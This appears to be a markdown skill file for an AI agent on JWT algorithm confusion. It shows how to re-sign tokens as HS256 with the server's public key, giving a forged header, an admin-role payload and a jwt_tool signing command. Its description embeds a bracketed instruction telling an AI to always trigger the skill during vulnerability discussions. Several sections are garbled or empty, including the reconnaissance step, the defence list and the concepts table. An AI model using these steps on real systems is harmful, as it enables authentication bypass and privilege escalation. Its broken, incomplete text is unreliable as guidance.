---
name: jwt-algorithm-confusion
description: >
  [CRITICAL: MUST trigger this skill whenever related vulnerability testing is discussed.]
  Identify and exploit Algorithm Confusion vulnerabilities in JSON Web Tokens (JWT). This skill 
  details how to bypass signature verification by changing the signing algorithm from asymmetric (RS256) 
  to symmetric (HS256) and using the public key as the symmetric secret.
domain: cybersecurity
subdomain: bug-hunting
category: APIs
difficulty: advanced
estimated_time: "2 hours"
mitre_attack:
  tactics: [TA0006, TA0004]
  techniques: [T1550.004]
platforms: [web, api]
tags: [jwt, api-security, logic-flaws, authentication, cryptography, bug-hunting]
tools: [burp-suite, json-web-tokens]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# JWT Algorithm Confusion

## When to Use
- When testing APIs or web applications that use JWTs for session management or authentication.
- To attempt to forge arbitrary JWTs (e.g., escalating to 'admin') when the application utilizes an asymmetric signature algorithm (like RS256) and the application's public key can be obtained.

## Workflow

### Phase 1: Reconnaissance (Finding the Public Key)

```text
# Concept: JWT Algorithm Confusion ```

### Phase 2: Intercepting and Modifying the JWT Header

```json
// {
  "alg": "HS256",
  "typ": "JWT"
}
```

### Phase 3: Modifying the Payload (Privilege Escalation)

```json
// {
  "user": "attacker",
  "role": "admin",
  "iat": 1716260400
}
```

### Phase 4: Signing the Forged JWT

```bash
# jwt_tool.py [ENCODED_HEADER].[ENCODED_PAYLOAD] -S hs256 -k public_key.pem
```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Forge JWT ] --> B{Server Accepts? ]}
    B -->|Yes| C[Exploit API ]
    B -->|No| D[Check None Alg ]
    C --> E[Document Flaw ]
```

## 🔵 Blue Team Detection & Defense
- **Enforce Algorithm Verification**: **Library Updates**: **Public Key Secrecy (Symmetric fallback)**: Key Concepts
| Concept | Description |
|---------|-------------|
| Algorithm Confusion | |
| Cryptographic Integrity | |

## References
- PortSwigger: [JWT algorithm confusion](https://portswigger.net/web-security/jwt/algorithm-confusion)
- Auth0: [Critical vulnerabilities in JSON Web Token libraries](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)
